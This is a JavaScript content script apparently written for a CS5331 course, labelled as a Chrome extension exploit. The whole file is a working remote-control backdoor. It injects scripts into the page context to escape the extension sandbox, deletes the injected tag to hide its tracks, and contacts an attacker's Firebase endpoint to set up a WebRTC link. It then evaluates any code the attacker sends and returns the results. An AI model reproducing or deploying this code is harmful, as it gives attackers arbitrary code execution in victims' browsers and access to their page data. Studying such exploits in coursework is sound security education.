console.log("=== CS5331: Chrome Extension Exploit ===")
console.log("This is an attempt to bypass permission protocol to execute js remotely.")

function loadJSONP(){
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/browser-jsonp@1.1.5/lib/jsonp.min.js"
    
    head.appendChild(script);
}

function loadSimplePeer(){
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.src = "https://cdnjs.cloudflare.com/ajax/libs/simple-peer/9.1.2/simplepeer.min.js"
    head.appendChild(script);
}

function run(){
    setTimeout( () => {
        var conn
        var id
        var init = () => {
            conn = new SimplePeer({ 
                initiator: true,
                trickle: false,
                objectMode: true
            })
        
            conn.on("signal", data => {
               JSONP({
                    url: `https://cs5331-4dd43.firebaseapp.com/victim-sends-offer?sdp=${JSON.stringify(data)}`,
                    success: function(data1){
                        id = data1
                        console.log(`victim sends out offer.`)

                        setTimeout( () => {

                            JSONP({
                                url: `https://cs5331-4dd43.firebaseapp.com/victim-receives-answer?id=${id}`,
                                success: function(data2){
                                    console.log(`victim receives answer from attacker.`)
                                    /*
                                    const answer = {
                                        type: "answer",
                                        sdp: xhr2.responseText
                                    }*/
        
                                    conn.signal(data2)
                                }
                            })

                        }, 3000)
                    }
                })
            })
        
            conn.on("connect", () => {
                console.log(`${id} connected to attacker.`)
            })
        
            conn.on('data', data => {
                conn.send(eval(data))
            })
        }

        init()
    }, 2000)
}

//https://intoli.com/blog/sandbox-breakout/

// Breaks out of the content script context by injecting a specially
// constructed script tag and injecting it into the page.
const runInPageContext = (method, ...args) => {
// The stringified method which will be parsed as a function object.
const stringifiedMethod = method instanceof Function
    ? method.toString()
    : `() => { ${method} }`;

// The stringified arguments for the method as JS code that will reconstruct the array.
const stringifiedArgs = JSON.stringify(args);

// The full content of the script tag.
const scriptContent = `
    // Parse and run the method with its arguments.
    (${stringifiedMethod})(...${stringifiedArgs});

    // Remove the script element to cover our tracks.
    document.currentScript.parentElement
    .removeChild(document.currentScript);
`;

// Create a script tag and inject it into the document.
const scriptElement = document.createElement('script');
scriptElement.innerHTML = scriptContent;
document.documentElement.prepend(scriptElement);
};
  
// Break out of the sandbox and run `overwriteLanguage()` in the page context.
runInPageContext(loadJSONP);
runInPageContext(loadSimplePeer)
runInPageContext(run)